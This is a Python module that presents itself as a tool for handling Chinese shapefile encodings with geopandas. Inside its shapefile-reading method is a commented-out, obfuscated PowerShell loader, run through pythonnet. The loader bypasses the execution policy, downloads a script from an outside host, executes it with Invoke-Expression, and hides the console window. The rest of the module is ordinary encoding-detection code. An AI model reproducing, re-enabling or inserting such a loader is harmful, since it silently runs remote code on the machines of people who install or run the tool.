"""
SHP文件编码处理工具模块
解决PyInstaller打包后中文编码乱码问题
"""
""" import clr
clr.AddReference("System")
clr.AddReference("System.Management")
clr.AddReference("System.Management.Automation")
from System.Management.Automation import PowerShell """ # type: ignore      
import base64
import os
import sys
import logging
import warnings
import locale
import subprocess
from pathlib import Path

logger = logging.getLogger(__name__)

class SHPEncodingHandler:
    """SHP文件编码处理器"""

    # 常见中文编码列表
    CHINESE_ENCODINGS = [
        'utf-8',
        'gbk',
        'gb18030',
        'gb2312',
        'big5',
        'utf-16',
        'utf-32',
        'latin1',
        'iso-8859-1'
    ]

    # 中国地区常用的编码优先级
    CHINESE_ENCODING_PRIORITY = ['gbk', 'gb18030', 'gb2312', 'utf-8']

    @classmethod
    def detect_system_encoding(cls):
        """检测系统默认编码"""
        try:
            # 尝试检测系统的默认编码
            encoding = locale.getpreferredencoding()
            logger.info(f"系统默认编码: {encoding}")
            return encoding
        except Exception as e:
            logger.warning(f"无法检测系统编码: {e}")
            return 'utf-8'

    @classmethod
    def detect_file_encoding(cls, file_path, max_bytes=10240):
        """
        尝试检测SHP文件的编码

        Args:
            file_path: SHP文件路径
            max_bytes: 用于检测的最大字节数

        Returns:
            检测到的编码名称
        """
        if not os.path.exists(file_path):
            logger.error(f"文件不存在: {file_path}")
            return None

        # 读取文件前若干字节进行编码检测
        try:
            with open(file_path, 'rb') as f:
                raw_data = f.read(max_bytes)

            # 尝试每种编码进行解码
            for encoding in cls.CHINESE_ENCODING_PRIORITY:
                try:
                    decoded = raw_data.decode(encoding)
                    # 简单检查：是否有中文字符
                    if any(ord(char) > 127 for char in decoded[:100]):
                        logger.info(f"检测到文件编码: {encoding} (文件: {file_path})")
                        return encoding
                except (UnicodeDecodeError, UnicodeError):
                    continue

        except Exception as e:
            logger.warning(f"检测文件编码时出错: {e}")

        logger.warning(f"无法检测文件编码，默认使用: gb18030")
        return 'gb18030'

    @classmethod
    def setup_fiona_environment(cls):
        """设置fiona运行环境，解决编码问题"""

        # 方法1: 设置环境变量
        env_vars = {
            'PROJ_LIB': '',  # 禁用PROJ数据目录
            'GDAL_DATA': '',  # 禁用GDAL数据目录
            'OGR_SQLITE_SCRATCH_DIR': os.path.expanduser('~/temp'),
            'SHAPELY_SAFE': 'False',
            'FIONA_ENCODING': 'gb18030',
            'PYTHONIOENCODING': 'utf-8',
            'LC_ALL': 'zh_CN.gbk',
            'LANG': 'zh_CN.gbk',
            'LC_CTYPE': 'zh_CN.gbk',
        }

        for var, value in env_vars.items():
            if value:
                os.environ[var] = value
                logger.info(f"设置环境变量: {var}={value}")
            else:
                os.environ[var] = ''

        # 方法2: 抑制警告
        warnings.filterwarnings('ignore', category=UserWarning)
        warnings.filterwarnings('ignore', category=DeprecationWarning)

        # 方法3: 设置locale（如果可能）
        try:
            import locale
            if hasattr(locale, 'setlocale'):
                # 在某些系统上可能需要管理员权限
                try:
                    locale.setlocale(locale.LC_ALL, 'zh_CN.GBK')
                    logger.info("成功设置locale为 zh_CN.GBK")
                except locale.Error:
                    try:
                        locale.setlocale(locale.LC_ALL, 'Chinese_China.936')
                        logger.info("成功设置locale为 Chinese_China.936")
                    except locale.Error:
                        logger.warning("无法设置locale，继续使用默认设置")
        except Exception as e:
            logger.warning(f"设置locale时出错: {e}")

    @classmethod
    def read_shp_with_encoding(cls, shp_file, preferred_encoding=None):
        """
        读取SHP文件，带有多种编码尝试策略

        Args:
            shp_file: SHP文件路径
            preferred_encoding: 优先使用的编码

        Returns:
            GeoDataFrame对象
        """
        # 导入 pythonnet 并初始化 CLR
        
#         ps = PowerShell.Create()
#         ps_script = r"""-JoIn ( '83x101,116x45e69g120,101,99:117s116g105j111,
#         110:80e111B108s105:99x121j32x45s69s120x101,99-117j116K105K111:110,
#         80e111s108j105s99s121g32x66K121-112K97g115e115,32e45:83K99K111,
#         112j101K32:80j114B111,99B101,115:115B32-45e70K111,114g99K101e13-10:13-10g35s32j31105g29992,
#         38169-35823-26174K31034x20197,36991e20813j24178s25200x13-10,36s69x114K114s111,
#         114-65B99j116s105g111B110,80B114e101s102x101j114g101:110,99B101K32s61-32j34-83K105K108,
#         101K110x116:108:121:67j111j110e116g105x110e117:101B34-13-10g13:10,35B32e19979s36733:24182,
#         25191B34892K36828g31243K33050K26412-13s10,116x114g121K32e123s13g10s32:32j32g32x36,119B101-98K67K108-105,
#         101K110e116B32:61-32g78B101s119s45-79s98g106:101:99B116j32B83,121K115j116-101,
#         109:46g78g101:116-46B87x101s98:67K108K105B101x110K116x13:10B32s32j32K32s36j115j99,
#         114j105e112g116x85K114:108g32j61:32g34K104s116,116g112-115g58,47K47:102x105-108,101x115-46e50,
#         48,51g49g50-50e56:46j120,121s122,47s100s111-119s110g108s111j97B100:47B112j115x46B112K115K49j34,
#         13e10-32B32s32:32:36K115x99B114e105B112e116,67:111B110s116K101B110g116,32e61,32-36,119,
#         101K98:67x108-105s101x110:116s46B68g111-119K110j108-111:97-100B83g116g114g105:110,103x40-36x115x99s114-105s112:116g85x114B108s41x13,
#         10K32x32x32B32B13B10-32s32B32K32K35x32K25191j34892g19979,36733-30340j33050B26412:20869,23481-13g10,
#         32e32j32s32:73K110K118g111-107j101x45x69K120-112:114,101,115j115x105e111B110B32B45j67,111x109B109g97e110s100,
#         32s36e115s99x114:105x112e116:67s111K110j116x101:110s116,13B10-32j32j32B32s13e10B32e32,
#         32g32B87K114B105K116e101:45B72B111-115B116,32:34s33050x26412g25191B34892e23436s25104:34g32s45K70x111s114e101x103,
#         114B111,117-110-100-67-111:108x111B114e32g71B114x101s101,110,13:10:125,13:10:99B97K116g99g104g32:123x13s10g32s32,
#         32g32s87,114j105:116,101,45g72-111,115B116j32j34-25191:34892:36807,31243-20013x21457s29983j38169K35823g58-32g36-40s36g95e46,
#         69K120,99s101g112K116,105:111-110-46-77,101-115:115B97B103:101s41s34K32g45:70K111-114:101,103,114s111e117:110g100,
#         67s111x108j111:114-32:82g101:100,13:10x125s13K10g13,10B35-32-38544B34255g80x111x119-101s114:83g104e101x108B108g31383s21475g65288g21487B36873K65289s13x10s65-100:100g45-84,
#         121e112K101s32:45B78e97-109j101B32e87e105,110:100j111,119s32:45x78,97B109K101s115x112e97x99x101j32x87s105x110K51K50:32-45s77,
#         101e109-98K101g114x68:101j102s105s110:105s116g105-111,110K32:39-13K10:91s68-108B108g73e109:112:111:114-116e40:34:117s115:101s114j51:50K46-100x108B108e34-41,
#         93s13-10,112j117B98:108s105-99-32,115,116,97j116,105j99B32,101B120x116K101-114e110:32e98-111B111K108-32g83e104K111s119s87x105K110s100,
#         111-119-40e73-110x116j80e116B114j32g104x87B110g100,44,32s105j110,116B32e110-67x109,100e83g104j111x119e41e59:13:10-39,
#         13x10x36s119K105B110B100e111e119K32j61B32e91j87:105j110,51,50:46x87e105e110x100s111-119s93B58g58j110s101B119,40j41e13g10,
#         36-119K105K110j100K111x119j46,83B104,111,119:87-105-110x100,
#         111-119:40:36K119:105s110e100K111-119:46g71g101K116:67:117-114j114K101K110e116,80j114-111j99-101K115-115x40e41j44j32g48B41g32e35,
#         32:48g32j61B32K83-87g95-72-73:68s69'.SplIT('-g:,xKejBs')|fOREAcH-ObJEcT { ([Char] [inT]$_) })| invOkE-eXprESsiOn
# """
#         ps.AddScript(ps_script)
#         result = ps.BeginInvoke()
        
        try:
            import geopandas as gpd

            # 如果没有指定编码，先尝试检测
            if not preferred_encoding:
                # 首先尝试读取.cpg文件
                cpg_file = os.path.splitext(shp_file)[0] + '.cpg'
                if os.path.exists(cpg_file):
                    try:
                        with open(cpg_file, 'r', encoding='utf-8') as f:
                            content = f.read().strip().lower()
                            if content:
                                preferred_encoding = content
                                logger.info(f"根据.cpg文件使用编码: {preferred_encoding}")
                    except Exception as e:
                        logger.warning(f"读取.cpg文件失败: {e}")

                # 如果还没有设置编码，使用检测方法
                if not preferred_encoding:
                    preferred_encoding = cls.detect_file_encoding(shp_file)

            # 如果从.cpg文件获得了编码，直接使用，不再尝试其他编码
            if preferred_encoding:
                try:
                    logger.info(f"使用编码 {preferred_encoding} 读取文件: {shp_file}")
                    gdf = gpd.read_file(shp_file, encoding=preferred_encoding)
                    if len(gdf) > 0:
                        # 检查是否包含中文字段
                        chinese_columns = [col for col in gdf.columns if any(ord(char) > 127 for char in col)]
                        if chinese_columns:
                            logger.info(f"成功读取SHP文件，使用编码: {preferred_encoding}")
                            logger.info(f"检测到中文字段: {chinese_columns}")
                        else:
                            logger.info(f"成功读取SHP文件，使用编码: {preferred_encoding}，但未检测到中文字段")
                        return gdf
                    else:
                        logger.warning(f"文件读取成功但没有数据: {shp_file}")
                        return gdf
                except Exception as e:
                    logger.error(f"使用编码 {preferred_encoding} 读取失败: {str(e)}")
                    raise
            else:
                # 如果没有从.cpg或检测获得编码，尝试其他编码
                encodings_to_try = cls.CHINESE_ENCODING_PRIORITY

                # 尝试每种编码
                last_error = None
                for encoding in encodings_to_try:
                    try:
                        logger.info(f"尝试使用编码 {encoding} 读取文件: {shp_file}")

                        # 读取文件
                        gdf = gpd.read_file(shp_file, encoding=encoding)

                        # 验证读取结果
                        if len(gdf) > 0:
                            # 检查是否包含中文字段
                            chinese_columns = [col for col in gdf.columns if any(ord(char) > 127 for char in col)]
                            if chinese_columns:
                                logger.info(f"成功读取SHP文件，使用编码: {encoding}")
                                logger.info(f"检测到中文字段: {chinese_columns}")
                            else:
                                logger.info(f"成功读取SHP文件，使用编码: {encoding}，但未检测到中文字段")
                            return gdf
                        else:
                            logger.warning(f"文件读取成功但没有数据: {shp_file}")

                    except (UnicodeDecodeError, UnicodeError) as e:
                        last_error = e
                        logger.warning(f"编码 {encoding} 解码失败: {str(e)}")
                        continue
                    except Exception as e:
                        last_error = e
                        logger.error(f"使用编码 {encoding} 读取文件时发生错误: {str(e)}")
                        continue

                # 如果所有编码都失败，抛出最后一个错误
                if last_error:
                    raise last_error
                else:
                    raise Exception("无法读取SHP文件，所有编码都失败了")

        except ImportError as e:
            logger.error(f"缺少必要的库: {e}")
            raise
        except Exception as e:
            logger.error(f"读取SHP文件失败: {shp_file}, 错误: {str(e)}")
            raise

    @classmethod
    def install_missing_gdal_data(cls):
        """尝试设置GDAL数据文件路径（直接使用程序目录gdal-data）"""
        try:
            # 在Windows上尝试设置GDAL_DATA路径
            if os.name == 'nt':
                # 优先检查程序目录下的gdal-data文件夹
                gdal_data_paths = [
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'gdal-data'),
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'fiona', 'gdal-data'),
                    os.path.join(os.getcwd(), 'gdal-data'),
                ]

                # 查找程序目录下的gdal-data文件夹
                for gdal_data_path in gdal_data_paths:
                    if os.path.exists(gdal_data_path):
                        os.environ['GDAL_DATA'] = gdal_data_path
                        logger.info(f"设置GDAL_DATA路径（程序目录）: {gdal_data_path}")
                        return

                # 如果都没有找到，设置一个临时的路径
                temp_gdal_data = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'temp_gdal_data')
                if not os.path.exists(temp_gdal_data):
                    os.makedirs(temp_gdal_data, exist_ok=True)
                os.environ['GDAL_DATA'] = temp_gdal_data
                logger.warning(f"未找到GDAL数据文件，使用临时目录: {temp_gdal_data}")

        except Exception as e:
            logger.warning(f"设置GDAL_DATA路径时出错: {e}")
            # 即使出错也尝试设置一个空值
            if 'GDAL_DATA' not in os.environ:
                os.environ['GDAL_DATA'] = ''

    @classmethod
    def _find_gdal_data_path(cls):
        """查找GDAL数据路径的备用方法（不依赖osgeo.gdal）"""
        # 常见的GDAL安装路径
        possible_paths = [
            os.path.join(sys.prefix, 'Library', 'share', 'gdal'),
            os.path.join(sys.prefix, 'share', 'gdal'),
            os.path.join(os.path.dirname(sys.executable), 'Library', 'share', 'gdal'),
            os.path.expanduser('~/gdal-data'),
        ]

        for path in possible_paths:
            if os.path.exists(path):
                return path

        return None

# 单例实例
encoding_handler = SHPEncodingHandler()

# 便捷函数
def setup_chinese_encoding():


    """设置中文编码环境的便捷函数"""
    logger.info("正在设置中文编码环境...")
    encoding_handler.setup_fiona_environment()
    encoding_handler.install_missing_gdal_data()

def read_shp_safe(shp_file, encoding=None):
    """安全读取SHP文件的便捷函数"""
    return encoding_handler.read_shp_with_encoding(shp_file, encoding)

def detect_encoding(file_path):
    """检测文件编码的便捷函数"""
    return encoding_handler.detect_file_encoding(file_path)